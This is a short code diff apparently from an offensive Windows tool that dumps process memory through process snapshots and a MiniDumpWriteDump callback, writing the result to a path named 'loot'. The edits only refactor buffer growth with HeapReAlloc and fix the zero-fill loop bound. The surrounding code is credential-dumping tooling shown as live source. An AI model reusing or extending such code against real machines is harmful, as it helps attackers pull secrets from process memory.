@@ -15,6 +15,7 @@ typedef DWORD(__cdecl *PPssFreeSnapshot)(HANDLE, HPSS);
 // dump write path
 const LPCWSTR dmpPath = L"C:\\Windows\\Temp\\loot";
 
+// could also use std::vector
 typedef struct SmartArray {
 	LPVOID buffer;
 	int size;
@@ -114,14 +115,8 @@ BOOL CALLBACK MyMiniDumpWriteDumpCallback(
 				int oldSize = buff->size;
 				int newSize = ((CallbackInput->Io.Offset + CallbackInput->Io.BufferBytes) * 2) * 1.5;  // 1.5 multiplicative factor
 
-				// create new buffer
-				PVOID tempBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newSize);
-				// copy old buffer to new buffer
-				memcpy(tempBuff, buff->buffer, oldSize);
-				// free old buffer
-				HeapFree(GetProcessHeap(),0,buff->buffer);
-				// switch old with new buffer in callback parameter
-				buff->buffer = tempBuff;
+				// realloc and update size
+				buff->buffer = HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,buff->buffer, newSize);
 				buff->size = newSize;
 
 				// initalize new mem to '0'
@@ -194,7 +189,7 @@ BOOL pssMiniDumpLoot() {
 	};
 
 	// initialize buffer with '0' chars, since minidump doesn't write unreadable process memory
-	for (int i = 0; i < 1024 * 1024 * 75; i++) {
+	for (int i = 0; i < buff->size; i++) {
 		((char*) buff->buffer)[i] = '0';
 	}
 
